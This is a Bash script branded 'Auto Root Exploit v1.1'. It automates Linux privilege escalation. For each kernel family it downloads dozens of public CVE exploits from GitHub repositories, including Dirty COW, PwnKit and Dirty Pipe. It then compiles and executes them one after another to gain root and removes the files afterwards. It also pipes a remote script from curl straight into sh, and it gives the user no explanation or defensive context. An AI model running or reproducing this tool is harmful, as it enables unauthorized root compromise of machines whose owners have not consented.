#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if binary compiled successfully
check_binary() {
    if [ -f "$1" ]; then
        echo -e "${GREEN}[+] Binary $1 compiled successfully${NC}"
        return 0
    else
        echo -e "${RED}[!] Failed to compile $1${NC}"
        return 1
    fi
}

# Function to cleanup
cleanup() {
    rm -rf exploit exploit.c *.o *.sh 2>/dev/null
}

# Check gcc
echo -e "${YELLOW}[*] Checking requirements...${NC}"
gcc=$(which gcc)
if [ "$?" != "0" ]; then
    echo -e "${RED}[+] Gcc -> not found!${NC}"
    sleep 1
    echo "exiting!"
    exit 1
else
    echo -e "${GREEN}[+] Gcc    : found!${NC}"
    sleep 1
fi

# Check wget
wget=$(which wget)
if [ "$?" != "0" ]; then
    echo -e "${RED}[+] Wget -> not found!${NC}"
    sleep 1
    echo "exiting!"
    exit 1
else
    echo -e "${GREEN}[+] Wget    : found!${NC}"
    sleep 1
fi

# Check git
git=$(which git)
if [ "$?" != "0" ]; then
    echo -e "${YELLOW}[-] Git -> not found!${NC}"
    echo "[*] Continue ? (Y/N)"
    read -p "haxorsec@Localroot:~# " jawab
    if [ "$jawab" = "Y" ] || [ "$jawab" = "y" ]; then
        clear
    else
        echo -e "${RED}[-] Git -> not found!${NC}"
        sleep 1
        echo "exiting!"
        exit 1
    fi
else
    echo -e "${GREEN}[+] Git    : found!${NC}"
    sleep 1
fi

clear
echo "==================================================="
echo "              Auto Root Exploit v1.1"
echo "                by HaxorSecurity"
echo "==================================================="
echo "[x] Your Kernel : " 
uname -a
echo ""
echo "[x] Choose Your Kernel : "
echo "[1] 2x.x"
echo "[2] 3x.x"
echo "[3] 4x.x"
echo "[4] 5x.x"
echo "[5] TOP Exploit Root"
echo "[6] Folder Exploit"
read -p "haxorsec@Localroot:~# " localroot

link="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/"

kernel2=(
    2004/caps_to_root/15916.c
    2004/CVE-2004-0077/160.c
    2004/CVE-2004-1235/744.c
    2005/CVE-2005-0736/1397.c
    2005/CVE-2005-1263/25647.sh
    2006/CVE-2006-2451/2031.c
    2006/CVE-2006-3626/2013.c
    2008/CVE-2008-4210/6851.c
    2009/CVE-2009-1185/8478.sh
    2009/CVE-2009-1337/8369.sh
    2016/CVE-2016-5195/exp-1/dirty.c
)

kernel3=(
    2013/CVE-2013-0268/27297.c
    2013/CVE-2013-1858/clown-newuser.c
    2013/CVE-2013-2094/perf_swevent64.c
    2014/CVE-2014-0038/timeoutpwn64
    2014/CVE-2014-0196/cve-2014-0196-md.c
    2014/CVE-2014-3153/exp-1/35370.c
    2014/CVE-2014-3153/exp-2/towelroot.c
    2014/CVE-2014-4699/34134.c
    2014/CVE-2014-4014/33824.c
    2014/CVE-2014-9322/procrop.c
    2014/CVE-2014-9322/swapgs.c
    2014/CVE-2014-9322/z_shell.c
    2014/CVE-2014-9322/db.h
    2014/CVE-2014-9322/setss.S
    2015/CVE-2015-1328/37292.c
    2015/CVE-2015-8660/39166.c
    2016/CVE-2016-0728/cve-2016-0728.c
    2016/CVE-2016-9793/poc.c
    2017/CVE-2017-7308/poc.c
    2022/CVE20222639/exploit.c
    2022/CVE20222639/poc.c
)

kernel4=(
    2016/CVE-2016-8655/40871.c
    2017/CVE-2017-6074/poc.c
    2017/CVE-2017-16995/upstream44.c
    2018/CVE-2018-5333/exploit.c
    2019/CVE-2019-13272/CVE-2019-13272.c
)

kernel5x=(
    2019/CVE-2019-15666/lucky0
    2020/CVE-2020-8835/exp.c
    2020/CVE-2020-8835/bpf.h
    2021/CVE-2021-22555/exp-2/exploit.c
    2022/CVE20220847/exp-1/exp.sh
)

topexploit=(
    https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
    https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential
    https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
    https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
    https://raw.githubusercontent.com/n3rada/DirtyPipe/main/dpipe
)

# Exploit kernel 2x
if [ "$localroot" = "1" ]; then
    echo -e "${GREEN}[+] Downloading exploits for kernel 2x...${NC}"
    
    for kernel22 in "${kernel2[@]}"; do
        wget -q --no-check-certificate ${link}${kernel22}
    done
    
    echo -e "${YELLOW}[*] Starting exploitation attempts...${NC}"
    
    # CVE-2004 caps_to_root
    if [ -f 15916.c ]; then
        gcc -w 15916.c -o exploit 2>/dev/null
        if check_binary exploit; then
            setcap cap_sys_admin+ep exploit 2>/dev/null && ./exploit
        fi
        cleanup
    fi
    
    # CVE-2004-0077
    if [ -f 160.c ]; then
        gcc -O3 -static -fomit-frame-pointer 160.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2004-1235
    if [ -f 744.c ]; then
        gcc -O2 -fomit-frame-pointer 744.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2005-0736
    if [ -f 1397.c ]; then
        gcc -o exploit 1397.c -static -O2 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2006-2451
    if [ -f 2031.c ]; then
        gcc 2031.c -o exploit -static -Wall 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2006-3626
    if [ -f 2013.c ]; then
        gcc 2013.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2008-4210
    if [ -f 6851.c ]; then
        gcc 6851.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2016-5195 (Dirty COW)
    if [ -f dirty.c ]; then
        gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null
        if check_binary dirty; then
            ./dirty kontol1337
            rm -rf dirty
        fi
    fi
    
    # Shell script exploits
    [ -f 25647.sh ] && bash 25647.sh
    [ -f 8478.sh ] && bash 8478.sh
    [ -f 8369.sh ] && bash 8369.sh
    
    # CVE-2021-4034 (PwnKit)
    echo -e "${YELLOW}[+] Trying CVE-2021-4034 (PwnKit)...${NC}"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)" 2>/dev/null
    
    cleanup
    rm -rf *.sh 2>/dev/null
fi

# Exploit kernel 3x
if [ "$localroot" = "2" ]; then
    echo -e "${GREEN}[+] Downloading exploits for kernel 3x...${NC}"
    
    for kernel33 in "${kernel3[@]}"; do
        wget -q --no-check-certificate ${link}${kernel33}
    done
    
    echo -e "${YELLOW}[*] Starting exploitation attempts...${NC}"
    
    # CVE-2021-4034 (PwnKit)
    echo -e "${YELLOW}[+] Trying CVE-2021-4034 (PwnKit)...${NC}"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)" 2>/dev/null
    
    # CVE-2015-1328
    if [ -f 37292.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2015-1328...${NC}"
        gcc 37292.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2013-0268
    if [ -f 27297.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2013-0268...${NC}"
        gcc 27297.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2015-8660
    if [ -f 39166.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2015-8660...${NC}"
        gcc 39166.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2013-1858
    if [ -f clown-newuser.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2013-1858...${NC}"
        gcc -Wall clown-newuser.c -static -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2013-2094
    if [ -f perf_swevent64.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2013-2094...${NC}"
        gcc perf_swevent64.c -O2 -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit 0
        fi
        cleanup
    fi
    
    # CVE-2014-0038
    if [ -f timeoutpwn64 ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-0038...${NC}"
        chmod 0755 timeoutpwn64 && ./timeoutpwn64
        rm -rf timeoutpwn64
    fi
    
    # CVE-2014-0196
    if [ -f cve-2014-0196-md.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-0196...${NC}"
        gcc cve-2014-0196-md.c -lutil -lpthread -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2014-4699
    if [ -f 34134.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-4699...${NC}"
        gcc -O2 34134.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2014-4014
    if [ -f 33824.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-4014...${NC}"
        gcc 33824.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2016-0728
    if [ -f cve-2016-0728.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2016-0728...${NC}"
        gcc cve-2016-0728.c -o exploit -lkeyutils -Wall 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2014-9322
    if [ -f z_shell.c ] && [ -f procrop.c ] && [ -f swapgs.c ] && [ -f setss.S ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-9322...${NC}"
        gcc z_shell.c -o z_shell 2>/dev/null
        gcc -o procrop procrop.c setss.S 2>/dev/null
        gcc -o p_write8 swapgs.c setss.S -lpthread 2>/dev/null
        if [ -f procrop ] && [ -f p_write8 ]; then
            ./procrop 1 &
            ./p_write8 1
            rm -rf p_write8 procrop z_shell
        fi
    fi
    
    # CVE-2016-9793
    if [ -f poc.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2016-9793...${NC}"
        gcc -pthread poc.c -o exploit 2>/dev/null
        if check_binary exploit; then
            setcap cap_net_admin+ep ./exploit 2>/dev/null && ./exploit
        fi
        cleanup
    fi
    
    # CVE-2017-7308
    if [ -f poc.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2017-7308...${NC}"
        gcc poc.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2022-2639
    if [ -f exploit.c ] && [ -f poc.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2022-2639...${NC}"
        gcc exploit.c -o exploit -static -no-pie -s 2>/dev/null
        gcc poc.c -o poc -static -no-pie -Werror -s -Os -Wno-unused-result 2>/dev/null
        if [ -f exploit ] && [ -f poc ]; then
            ./poc && ./exploit
        fi
        cleanup
        rm -rf poc
    fi
    
    # CVE-2014-3153 exp-1
    if [ -f 35370.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-3153 (exp-1)...${NC}"
        gcc 35370.c -o exploit -lpthread 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2014-3153 exp-2
    if [ -f towelroot.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2014-3153 (exp-2)...${NC}"
        gcc -fno-stack-protector -m32 -O0 -pthread towelroot.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    rm -rf ./*.c ./*.h ./*.S 2>/dev/null
fi

# Exploit kernel 4x
if [ "$localroot" = "3" ]; then
    echo -e "${GREEN}[+] Downloading exploits for kernel 4x...${NC}"
    
    for kernel44 in "${kernel4[@]}"; do
        wget -q --no-check-certificate ${link}${kernel44}
    done
    
    echo -e "${YELLOW}[*] Starting exploitation attempts...${NC}"
    
    # CVE-2016-8655
    if [ -f 40871.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2016-8655...${NC}"
        gcc 40871.c -o exploit -lpthread 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2017-6074
    if [ -f poc.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2017-6074...${NC}"
        gcc poc.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2017-16995
    if [ -f upstream44.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2017-16995...${NC}"
        gcc upstream44.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2018-5333
    if [ -f exploit.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2018-5333...${NC}"
        gcc -O3 -pthread -static -g -masm=intel ./exploit.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2019-13272
    if [ -f CVE-2019-13272.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2019-13272...${NC}"
        gcc -s CVE-2019-13272.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    rm -rf ./*.c 2>/dev/null
fi

# Exploit kernel 5x
if [ "$localroot" = "4" ]; then
    echo -e "${GREEN}[+] Downloading exploits for kernel 5x...${NC}"
    
    for kernel55 in "${kernel5x[@]}"; do
        wget -q --no-check-certificate ${link}${kernel55}
    done
    
    echo -e "${YELLOW}[*] Starting exploitation attempts...${NC}"
    
    # CVE-2020-8835
    if [ -f exp.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2020-8835...${NC}"
        gcc exp.c -o exploit -static 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2021-22555
    if [ -f exploit.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2021-22555...${NC}"
        gcc exploit.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
        cleanup
    fi
    
    # CVE-2022-0847
    if [ -f exp.sh ]; then
        echo -e "${YELLOW}[+] Trying CVE-2022-0847...${NC}"
        bash exp.sh
        rm -rf exp.sh
    fi
    
    # CVE-2019-15666
    if [ -f lucky0 ]; then
        echo -e "${YELLOW}[+] Trying CVE-2019-15666...${NC}"
        chmod 0755 lucky0
        timeout 60 bash -c 'while :; do ./lucky0 -q && break; done'
        rm -rf lucky0
    fi
    
    rm -rf ./*.c ./*.h 2>/dev/null
fi

# Top exploits
if [ "$localroot" = "5" ]; then
    echo -e "${GREEN}[+] Downloading top exploits...${NC}"
    
    for top in "${topexploit[@]}"; do
        wget -q --no-check-certificate "$top"
    done
    
    echo -e "${YELLOW}[*] Starting exploitation attempts...${NC}"
    
    # CVE-2021-3493
    if [ -f exploit.c ]; then
        echo -e "${YELLOW}[+] Trying CVE-2021-3493...${NC}"
        gcc exploit.c -o exploit 2>/dev/null
        if check_binary exploit; then
            chmod 0755 exploit && ./exploit
        fi
        cleanup
    fi
    
    # CVE-2022-2588
    if [ -f exp_file_credential ]; then
        echo -e "${YELLOW}[+] Trying CVE-2022-2588...${NC}"
        chmod 0755 exp_file_credential && ./exp_file_credential
        rm -rf exp_file_credential
    fi
    
    # CVE-2021-4034 (PwnKit)
    if [ -f PwnKit ]; then
        echo -e "${YELLOW}[+] Trying CVE-2021-4034 (PwnKit)...${NC}"
        chmod 0755 PwnKit && ./PwnKit
        rm -rf PwnKit
    fi
    
    # CVE-2023-2640/CVE-2023-32629
    if [ -f exploit.sh ]; then
        echo -e "${YELLOW}[+] Trying CVE-2023-2640/CVE-2023-32629...${NC}"
        bash exploit.sh
        rm -rf exploit.sh
    fi
    
    # CVE-2022-0847 (Dirty Pipe)
    if [ -f dpipe ]; then
        echo -e "${YELLOW}[+] Trying CVE-2022-0847 (Dirty Pipe)...${NC}"
        chmod +x dpipe && ./dpipe --root
        rm -rf dpipe
    fi
    
    # CVE-2021-3560 (Dirty Sock)
    echo -e "${YELLOW}[+] Trying CVE-2021-3560 (Dirty Sock)...${NC}"
    if [ -d dirty_sock ]; then rm -rf dirty_sock; fi
    git clone https://github.com/initstring/dirty_sock 2>/dev/null
    if [ -d dirty_sock ]; then
        cd dirty_sock && python3 dirty_sockv2.py 2>/dev/null
        cd ..
        rm -rf dirty_sock
    fi
    
    # Screen exploit
    echo -e "${YELLOW}[+] Trying Screen exploit...${NC}"
    wget -q --no-check-certificate https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh
    if [ -f screenroot.sh ]; then
        bash screenroot.sh
        rm -rf screenroot.sh
    fi
    
    # CVE-2021-33909
    echo -e "${YELLOW}[+] Trying CVE-2021-33909...${NC}"
    wget -q --no-check-certificate https://raw.githubusercontent.com/Liang2580/CVE-2021-33909/main/exploit.c -O cve33909.c
    if [ -f cve33909.c ]; then
        gcc cve33909.c -o exploit 2>/dev/null
        if check_binary exploit; then
            chmod +x exploit && ./exploit
        fi
        cleanup
        rm -rf cve33909.c
    fi
    
    # CVE-2022-37706
    echo -e "${YELLOW}[+] Trying CVE-2022-37706...${NC}"
    wget -q --no-check-certificate https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh -O cve37706.sh
    if [ -f cve37706.sh ]; then
        bash cve37706.sh
        rm -rf cve37706.sh
    fi
    
    # CVE-2017-1000112
    echo -e "${YELLOW}[+] Trying CVE-2017-1000112...${NC}"
    wget -q --no-check-certificate https://raw.githubusercontent.com/jollheef/lpe/master/CVE-2017-1000112/CVE-2017-1000112.c -O pwn.c
    if [ -f pwn.c ]; then
        gcc pwn.c -o pwn 2>/dev/null
        if check_binary pwn; then
            ./pwn
        fi
        rm -rf pwn pwn.c
    fi
    
    # CVE-2017-5899
    echo -e "${YELLOW}[+] Trying CVE-2017-5899...${NC}"
    wget -q --no-check-certificate https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh -O cve5899.sh
    if [ -f cve5899.sh ]; then
        bash cve5899.sh
        rm -rf cve5899.sh
    fi
    
    # CVE-2021-4154
    echo -e "${YELLOW}[+] Trying CVE-2021-4154...${NC}"
    if [ -d CVE-2021-4154 ]; then rm -rf CVE-2021-4154; fi
    git clone https://github.com/Markakd/CVE-2021-4154 2>/dev/null
    if [ -d CVE-2021-4154 ]; then
        cd CVE-2021-4154
        gcc exp.c -o exp 2>/dev/null
        gcc kctf_exp.c -o kctf 2>/dev/null
        [ -f exp ] && ./exp
        [ -f kctf ] && ./kctf
        cd ..
        rm -rf CVE-2021-4154
    fi
    
    cleanup
fi

# Folder exploit
if [ "$localroot" = "6" ]; then
    echo -e "${GREEN}[+] Cloning exploit repository...${NC}"
    
    if [ -d /tmp/Linux-Privilege-Escalation-Exploits ]; then
        rm -rf /tmp/Linux-Privilege-Escalation-Exploits
    fi
    
    git clone https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits/ /tmp/Linux-Privilege-Escalation-Exploits 2>/dev/null
    
    if [ ! -d /tmp/Linux-Privilege-Escalation-Exploits ]; then
        echo -e "${RED}[!] Failed to clone repository${NC}"
        exit 1
    fi
    
    BASE_DIR="/tmp/Linux-Privilege-Escalation-Exploits"
    
    echo -e "${YELLOW}[*] Starting exploitation attempts from repository...${NC}"
    
    # CVE-2022-0847 exp-1
    echo -e "${YELLOW}[+] Trying CVE-2022-0847 (exp-1)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0847/exp-1/exp.sh" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0847/exp-1" && bash exp.sh
    fi
    
    # CVE-2022-0847 exp-2
    echo -e "${YELLOW}[+] Trying CVE-2022-0847 (exp-2)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0847/exp-2/dirtypipez.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0847/exp-2"
        gcc dirtypipez.c -o dpipe -lpthread 2>/dev/null
        if check_binary dpipe; then
            ./dpipe /bin/su
        fi
    fi
    
    # CVE-2022-0847 exp-3
    echo -e "${YELLOW}[+] Trying CVE-2022-0847 (exp-3)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0847/exp-3/exploit.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0847/exp-3"
        gcc exploit.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit /bin/sh dW5hbWUgLWE7aWQ=
        fi
    fi
    
    # CVE-2022-0995
    echo -e "${YELLOW}[+] Trying CVE-2022-0995...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0995/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0995"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-1015
    echo -e "${YELLOW}[+] Trying CVE-2022-1015...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-1015/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-1015"
        make 2>/dev/null && [ -f pwn ] && ./pwn
    fi
    
    # CVE-2022-23222
    echo -e "${YELLOW}[+] Trying CVE-2022-23222...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-23222/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-23222"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-25636 exp-1
    echo -e "${YELLOW}[+] Trying CVE-2022-25636 (exp-1)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-25636/exp-1/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-25636/exp-1"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-2585
    echo -e "${YELLOW}[+] Trying CVE-2022-2585...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2585/exploit.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2585"
        gcc exploit.c -o exploit -lpthread 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
    fi
    
    # CVE-2022-2586
    echo -e "${YELLOW}[+] Trying CVE-2022-2586...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2586/CVE-2022-2586.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2586"
        gcc CVE-2022-2586.c -o exploit -lmnl -lnftnl -no-pie -lpthread 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
    fi
    
    # CVE-2022-2588
    echo -e "${YELLOW}[+] Trying CVE-2022-2588...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2588/exp_file_credential" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2588"
        chmod +x exp_file_credential && ./exp_file_credential
    fi
    
    # CVE-2022-2602 exp-1
    echo -e "${YELLOW}[+] Trying CVE-2022-2602 (exp-1)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2602/exp-1/exploit.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2602/exp-1"
        gcc exploit.c -o exploit -pthread 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
    fi
    
    # CVE-2022-2602 exp-2
    echo -e "${YELLOW}[+] Trying CVE-2022-2602 (exp-2)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2602/exp-2/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2602/exp-2"
        make 2>/dev/null
        [ -f poc_userfaultfd ] && ./poc_userfaultfd
        [ -f poc_inode_locking ] && ./poc_inode_locking
    fi
    
    # CVE-2022-2639
    echo -e "${YELLOW}[+] Trying CVE-2022-2639...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-2639/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-2639"
        make 2>/dev/null
        [ -f poc ] && ./poc
        [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-32250
    echo -e "${YELLOW}[+] Trying CVE-2022-32250...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-32250/exploit.c" ]; then
        cd "$BASE_DIR/2022/CVE-2022-32250"
        gcc -lmnl -lnftnl exploit.c -o exploit 2>/dev/null
        if check_binary exploit; then
            ./exploit
        fi
    fi
    
    # CVE-2022-34918 exp-1
    echo -e "${YELLOW}[+] Trying CVE-2022-34918 (exp-1)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-34918/exp-1/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-34918/exp-1"
        make 2>/dev/null && [ -f poc ] && ./poc
    fi
    
    # CVE-2019-7304
    echo -e "${YELLOW}[+] Trying CVE-2019-7304...${NC}"
    if [ -f "$BASE_DIR/2019/CVE-2019-7304/dirty_sockv2.py" ]; then
        cd "$BASE_DIR/2019/CVE-2019-7304"
        python3 ./dirty_sockv2.py 2>/dev/null
    fi
    
    # CVE-2022-27666
    echo -e "${YELLOW}[+] Trying CVE-2022-27666...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-27666/compile.sh" ]; then
        cd "$BASE_DIR/2022/CVE-2022-27666"
        bash compile.sh 2>/dev/null && bash run.sh 2>/dev/null
    fi
    
    # CVE-2019-15666
    echo -e "${YELLOW}[+] Trying CVE-2019-15666...${NC}"
    if [ -f "$BASE_DIR/2019/CVE-2019-15666/lucky0" ]; then
        cd "$BASE_DIR/2019/CVE-2019-15666"
        chmod +x lucky0
        timeout 60 bash -c 'while :; do ./lucky0 -q && break; done'
    fi
    
    # CVE-2020-8835
    echo -e "${YELLOW}[+] Trying CVE-2020-8835...${NC}"
    if [ -f "$BASE_DIR/2020/CVE-2020-8835/exp.c" ]; then
        cd "$BASE_DIR/2020/CVE-2020-8835"
        gcc exp.c -o exp -static 2>/dev/null
        if check_binary exp; then
            ./exp
        fi
    fi
    
    # CVE-2021-3156
    echo -e "${YELLOW}[+] Trying CVE-2021-3156...${NC}"
    if [ -f "$BASE_DIR/2021/CVE-2021-3156/Makefile" ]; then
        cd "$BASE_DIR/2021/CVE-2021-3156"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-34918 exp-2
    echo -e "${YELLOW}[+] Trying CVE-2022-34918 (exp-2)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-34918/exp-2/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-34918/exp-2"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2021-27365
    echo -e "${YELLOW}[+] Trying CVE-2021-27365...${NC}"
    if [ -f "$BASE_DIR/2021/CVE-2021-27365/Makefile" ]; then
        cd "$BASE_DIR/2021/CVE-2021-27365"
        make 2>/dev/null
        if [ -f a.sh ]; then
            cp a.sh /tmp/
            chmod +x /tmp/a.sh
        fi
        [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-0185 exp-1
    echo -e "${YELLOW}[+] Trying CVE-2022-0185 (exp-1)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0185/exp-1/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0185/exp-1"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-0185 exp-2
    echo -e "${YELLOW}[+] Trying CVE-2022-0185 (exp-2)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-0185/exp-2/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-0185/exp-2"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2022-25636 exp-2
    echo -e "${YELLOW}[+] Trying CVE-2022-25636 (exp-2)...${NC}"
    if [ -f "$BASE_DIR/2022/CVE-2022-25636/exp-2/Makefile" ]; then
        cd "$BASE_DIR/2022/CVE-2022-25636/exp-2"
        make 2>/dev/null && [ -f exploit ] && ./exploit
    fi
    
    # CVE-2017-1000367
    echo -e "${YELLOW}[+] Trying CVE-2017-1000367...${NC}"
    if [ -f "$BASE_DIR/2017/CVE-2017-1000367/sudopwn.c" ]; then
        cd "$BASE_DIR/2017/CVE-2017-1000367"
        gcc -o sudopwn sudopwn.c -lutil 2>/dev/null
        if check_binary sudopwn; then
            ./sudopwn
        fi
    fi
    
    # Cleanup
    cd /tmp
    rm -rf /tmp/Linux-Privilege-Escalation-Exploits
fi

echo -e "${GREEN}[+] All exploitation attempts completed!${NC}"
echo -e "${YELLOW}[*] If still not root, try different kernel version or manual exploitation${NC}"
